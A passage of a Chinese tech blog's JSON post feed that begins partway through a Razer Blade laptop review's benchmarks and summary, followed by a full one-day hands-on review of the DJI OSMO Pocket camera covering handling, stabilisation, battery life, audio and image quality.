分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]